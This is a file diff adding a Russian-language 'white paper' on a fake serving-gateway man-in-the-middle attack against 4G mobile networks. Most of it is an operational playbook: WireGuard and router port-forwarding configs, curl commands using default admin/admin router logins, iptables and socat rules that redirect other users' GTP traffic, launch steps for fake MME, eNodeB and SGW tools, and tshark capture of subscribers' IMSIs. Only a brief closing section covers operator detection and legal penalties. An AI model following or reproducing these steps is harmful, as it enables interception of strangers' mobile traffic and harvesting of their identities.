@@ -1,0 +1,359 @@
+В этом исследовании мы попытаемся разработать новый тип атаки — sgw-mitm
+Сама суть атаки заключается в подмене sgw — serving gateway, распределяющего трафик в 4g сети
+Структура 4g подключения: от телефона к интернету:
+          Точка доступа.    Выход в интернет
+                     |                          |
+       UE--->eNB--->SGW--->PGW
+         |                        |
+(телефон)         обслуживающий путь
+
+Что нам даёт подменный SGW в сети:
+1. Контроль над трафиком, проходящим через нас
+2. Теоретический SSL interception (сложно из-за проверок целостности, но возможно)
+3. Sniffing GTP трафика
+
+4. Сбор IMSI клиентов — IMSI CATCHING
+
+Сложности:
+1. Проверки целостности — шифрование, контроль RRC, контрольные суммы
+2. CG-NAT, разделение на подсети
+3. APC control
+
+Требования:
+1. Роутер/VPS/VDS/ПК с «белым» (публичным) IPv4 (Очень важно, что именно IPv4)
+
+2. Телефон с root правами и Andrax (подойдут magisk SU/KernelSU/superSU)
+Версии Andrax с нужным инструментарием:
+v5r stable
+v6r unstable [chambers]
+Andrax-NG v1001, v1002 (от snakesecurity)
+3. Клиент wireguard на телефоне и сервер wireguard на доп. устройстве с белым ip
+
+
+Для чего нам нужен wireguard:
+Так как мы используем телефон с Andrax как основной инструмент атаки (в частности инструменты SGW-HACK, SOCAT)
+Мы находимся за carrier-grade nat
+Он разделяет клиентов на разные подсети и изолирует
+Это критично для проведения нашей атаки, так что мы используем wireguard и port-forwarding для того, чтобы получить белый ip с SIM-карты и начать эмуляцию SGW
+
+Сначала нам нужно сгенерировать ключ wireguard на сервере
+
+Настроим директории и права:
+```
+
+sudo su
+cd /etc/wireguard/
+umask 077
+
+```
+
+Сгенерируем ключи для сервера
+```
+
+wg genkey | tee server_private.key | wg pubkey > server_public.key
+
+```
+
+Скопируйте публичный ключ — он нам понадобится позже
+```
+
+cat /etc/wireguard/server_public.key
+
+```
+
+Теперь нам нужно создать файлы конфигурации:
+
+Для сервера/роутера/VPS/VDS с «белым» IP:
+```
+
+nano /etc/wireguard/wg0.conf
+
+```
+
+Пример конфиг-файла сервера:
+[Interface]
+Name = wg0
+Address = 10.8.0.1/24
+ListenPort = 51820
+PrivateKey = <SERVER_PRIVATE_KEY>
+
+PostUp =
+  sysctl -w net.ipv4.ip_forward=1;
+  iptables -A FORWARD -i wg0 -j ACCEPT;
+  iptables -A FORWARD -o wg0 -j ACCEPT;
+  iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE;
+  iptables -t nat -A PREROUTING -p udp --dport 2123 -j DNAT --to-destination 10.8.0.2:2123;
+  iptables -t nat -A PREROUTING -p udp --dport 2152 -j DNAT --to-destination 10.8.0.2:2152;
+
+PostDown =
+  iptables -D FORWARD -i wg0 -j ACCEPT;
+  iptables -D FORWARD -o wg0 -j ACCEPT;
+  iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE;
+  iptables -t nat -D PREROUTING -p udp --dport 2123 -j DNAT --to-destination 10.8.0.2:2123;
+  iptables -t nat -D PREROUTING -p udp --dport 2152 -j DNAT --to-destination 10.8.0.2:2152;
+
+[Peer]
+PublicKey = <ANDROID_PUBLIC_KEY>
+AllowedIPs = 10.8.0.2/32
+PersistentKeepalive = 25
+
+(Замените IP где нужно)
+
+
+Теперь конфигурация для Android (wg-android.conf):
+[Interface]
+Name = wg-gtp
+Address = 10.8.0.2/24
+PrivateKey = <ANDROID_PRIVATE_KEY>
+DNS = 8.8.8.8
+
+PostUp =
+  ip rule add from 10.8.0.2 table 200;
+  ip route add default via 10.8.0.1 dev wg-gtp table 200;
+  ip route flush cache;
+
+PostDown =
+  ip rule del from 10.8.0.2 table 200;
+  ip route flush table 200;
+  ip route flush cache;
+
+[Peer]
+PublicKey = <SERVER_PUBLIC_KEY>
+# Ваш ПУБЛИЧНЫЙ IP роутера (80.71.169.245 или DDNS домен)
+Endpoint = 80.71.169.245:51820
+AllowedIPs = 0.0.0.0/0
+PersistentKeepalive = 25
+
+(Замените ip где нужно)
+
+После этого нужно пробросить порты
+В данном white-paper я приведу схему и команды для проброса портов
+Схема:
+Порт 51820/UDP → WireGuard VPN (основной туннель)
+Порт 2123/UDP  → GTP-C (контрольная плоскость)
+Порт 2152/UDP  → GTP-U (пользовательская плоскость)
+
+Проброс для TP-Link/D-Link/Tenda:
+# Адрес роутера: 192.168.0.1 или 192.168.1.1
+# Логин/пароль: admin/admin
+
+# Команды через curl (автоматизация):
+curl -u admin:admin "http://192.168.1.1/userRpm/NatVirtualServerRpm.htm" \
+  --referer "http://192.168.1.1/userRpm/NatVirtualServerRpm.htm" \
+  --data "availChannel=0&page=1&StartPort=51820&EndPort=51820&Protocol=UDP&IpAddr=192,168,1,100&Enabled=1&Save=%D0%A1%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B8%D1%82%D1%8C"
+
+Роутеры Ростелеком:
+# Часто используется: 192.168.1.1 или 192.168.0.1
+# Логин/пароль: admin или user/user
+
+# Через веб:
+# Дополнительные настройки → Межсетевой экран → Виртуальные серверы
+
+Когда всё для серверной части атаки готово, можно приступить к Andrax
+
+1. Подключить wireguard
+2. Уже в терминале Andrax:
+1.1:
+# Критически важный шаг! Без этого трафик не пойдёт через SGW
+
+# Очистите старые правила
+iptables -t nat -F
+iptables -F
+
+# Включите форвардинг
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# ПРАВИЛО 1: Весь исходящий GTP трафик через WireGuard
+iptables -t nat -A OUTPUT -p udp --dport 2123 -j DNAT --to-destination 10.8.0.2:2123
+iptables -t nat -A OUTPUT -p udp --dport 2152 -j DNAT --to-destination 10.8.0.2:2152
+
+# ПРАВИЛО 2: Маскировка обратного трафика
+iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE
+
+# ПРАВИЛО 3: Разрешить форвардинг между интерфейсами
+iptables -A FORWARD -i rmnet0 -o wg0 -j ACCEPT
+iptables -A FORWARD -i wg0 -o rmnet0 -j ACCEPT
+
+# Проверьте правила:
+iptables -t nat -L -n -v
+
+1.2:
+# На Android запустите SGW-HACK на IP WireGuard (КРИТИЧЕСКИ ВАЖНО — НА IP WIREGUARD):
+SGW-HACK \
+  -s11 "10.8.0.2" \
+  -s1u "10.8.0.2" \
+  -s5c "10.8.0.2" \
+  -s5u "10.8.0.2" &
+# Запустится в фоне на портах 2123 и 2152
+
+# Проверьте, что слушает порты:
+netstat -tulpn | grep -E "2123|2152"
+# Должно показать: udp 0 0 10.8.0.2:2123 и :2152
+
+
+1.3 Запуск tshark:
+tshark -i wg0 -f "udp port 2123 or udp port 2152" \
+  -Y "gtpv2" \
+  -T fields \
+  -e frame.time \
+  -e ip.src \
+  -e ip.dst \
+  -e gtp.message \
+  -e gtp.imsi \
+  -e gtp.teid \
+  -l
+
+
+Но, возможно, на этом моменте появляется другая сложность:
+«Как мы должны перехватить трафик клиентов, находясь за пределами сети оператора?»
+Тут нам поможет MME-eNodeB-HACK, eNodeB-HACK и SOCAT redirecting
+
+# Определяем IP
+LOCAL_IP=$(ip route get 8.8.8.8 | awk '{print $7}')
+PUBLIC_IP=$(curl -s ifconfig.me)
+
+# Убиваем старые процессы
+pkill -f mme
+pkill -f eNodeB
+pkill -f SGW-HACK
+pkill -f socat
+
+Далее
+# Очистка старых правил
+iptables -t nat -F
+iptables -F
+
+# Включаем форвардинг
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# КРИТИЧЕСКИЕ ПРАВИЛА ДЛЯ ПЕРЕХВАТА ЧУЖОГО ТРАФИКА:
+
+# 1. Перехват ВСЕГО входящего GTP-C трафика на наш публичный IP
+iptables -t nat -A PREROUTING -d $PUBLIC_IP -p udp --dport 2123 -j REDIRECT --to-port 36412
+# 2123 (GTP-C/S11) → 36412 (S1-MME порт MME)
+
+# 2. Перехват ВСЕГО входящего GTP-U трафика
+iptables -t nat -A PREROUTING -d $PUBLIC_IP -p udp --dport 2152 -j REDIRECT --to-port 2152
+# 2152 (GTP-U) остаётся на том же порту для eNodeB
+
+# 3. Разрешаем входящие подключения
+iptables -A INPUT -p udp --dport 36412 -j ACCEPT  # S1-MME
+iptables -A INPUT -p udp --dport 2123 -j ACCEPT   # GTP-C
+iptables -A INPUT -p udp --dport 2152 -j ACCEPT   # GTP-U
+
+# 4. Маскировка исходящего трафика
+iptables -t nat -A POSTROUTING -o rmnet0 -j MASQUERADE
+
+# Проверяем правила
+iptables -t nat -L -n -v
+
+Запуск fake-MME:
+# 1. Запуск MME (слушает S1-MME на 127.0.1.12:36412, S11 на 127.0.1.12:2123)
+mme > /data/local/tmp/mme.log 2>&1 &
+MME_PID=$!
+echo "[+] MME запущен (PID: $MME_PID)"
+sleep 3
+
+# 2. Запуск eNodeB (подключается к MME, слушает S1-U на 127.0.0.11:2152)
+eNodeB > /data/local/tmp/enb.log 2>&1 &
+ENB_PID=$!
+echo "[+] eNodeB запущен (PID: $ENB_PID)"
+sleep 5
+
+# 3. Проверка подключения
+if tail -10 /data/local/tmp/enb.log | grep -q "Established S1-MME connection"; then
+    echo "[+] eNodeB подключился к MME"
+else
+    echo "[!] Ошибка подключения eNodeB к MME"
+    tail -20 /data/local/tmp/enb.log
+    exit 1
+fi
+
+# КРИТИЧЕСКИЙ ЭТАП: Перенаправляем реальный трафик в нашу фальшивую сеть
+
+# 1. S1-MME трафик (порт 36412) → наш MME
+socat UDP4-LISTEN:36412,bind=0.0.0.0,fork,reuseaddr \
+    UDP4:127.0.1.12:36412 &
+SOCAT_MME_PID=$!
+echo "[+] SOCAT S1-MME: 0.0.0.0:36412 → 127.0.1.12:36412"
+
+# 2. S1-U трафик (GTP-U порт 2152) → наш eNodeB
+socat UDP4-LISTEN:2152,bind=0.0.0.0,fork,reuseaddr \
+    UDP4:127.0.0.11:2152 &
+SOCAT_ENB_PID=$!
+echo "[+] SOCAT S1-U: 0.0.0.0:2152 → 127.0.0.11:2152"
+
+# 3. S11 трафик (GTP-C порт 2123) → наш MME (или фальшивый SGW)
+socat UDP4-LISTEN:2123,bind=0.0.0.0,fork,reuseaddr \
+    UDP4:127.0.1.12:2123 &
+SOCAT_S11_PID=$!
+echo "[+] SOCAT S11: 0.0.0.0:2123 → 127.0.1.12:2123"
+
+# MME отправляет S11 сообщения на 127.0.1.12:2123
+# Но нужно их перехватить и обработать
+
+# Запускаем фальшивый SGW, который будет слушать S11
+SGW-HACK \
+  -s11 "127.0.0.112" \
+  -s1u "127.0.0.2" \
+  -s5c "127.0.0.51" \
+  -s5u "127.0.0.3" > /data/local/tmp/sgw.log 2>&1 &
+SGW_PID=$!
+echo "[+] Фальшивый SGW запущен (PID: $SGW_PID)"
+
+# Перенаправляем S11 от MME к нашему SGW
+socat UDP4-LISTEN:2124,bind=127.0.1.12,fork,reuseaddr \
+    UDP4:127.0.0.112:2123 &
+SOCAT_S11_REDIRECT=$!
+echo "[+] SOCAT S11 перенаправление: 127.0.1.12:2124 → 127.0.0.112:2123"
+
+# Если нужен выход в интернет через наш фальшивый SGW
+
+# 1. Запуск WireGuard (если настроен)
+wg-quick up /data/local/tmp/wg-android.conf 2>/dev/null || true
+
+# 2. Маршрутизация трафика через наш SGW
+iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE 2>/dev/null || true
+
+ Так как в ENodeB-HACK уже используется настоящее подключение к MME (настоящей или фейковой), клиенты будут подключаться к нашим станциям
+
+С помощью этого у нас получается такая цепь атаки:
+UE--->FAKE eNodeB--->fakeSGW--->|
+                                                              |
+                                                              |
+                                                    Attacker's SIM
+                                                             |
+                                                             |
+                                                      REAL-eNodeB,SGW,PGW(+ real SIM AUTH to MME)
+
+В чём плюсы этой атаки перед другими?
+1. Полный контроль над трафиком
+2. Теоретическая возможность SSL interception
+3. Минимальное оборудование — только 2/3 устройства
+4. Относительно большой охват (Fake eNodeB выступает только как ловец клиентов, fake-SGW обслуживает сразу несколько сот)
+5. Быстрое развёртывание инфраструктуры
+6. Поддержка реальных механизмов аутентификации
+
+ДЛЯ ОПЕРАТОРОВ:
+
+5. ОБНАРУЖЕНИЕ И ПРОТИВОДЕЙСТВИЕ
+
+5.1 Как операторы обнаруживают подобные атаки:
+- Мониторинг аномального GTP трафика (неизвестные IP SGW)
+- Анализ сигнатур RRC сообщений
+- Корреляционный анализ логов (MME-HSS-PGW)
+- Системы обнаружения мошенничества (Fraud Detection)
+
+5.2 Время до обнаружения:
+- Само-MITM: 2–24 часа (зависит от активности)
+- Fake eNodeB: 5–30 минут (радиомониторинг)
+- GTP перенаправление: 1–6 часов
+
+5.3 Юридические последствия:
+- Уголовная ответственность по статьям 272, 273, 274 УК РФ
+- Блокировка SIM-карты и оборудования
+- Внесение в реестр нарушителей
+
+5.4 Что стоит улучшить:
+Внедрить жёсткую фильтрацию IP сервисных частей сети
+Вести постоянный мониторинг GTP трафика
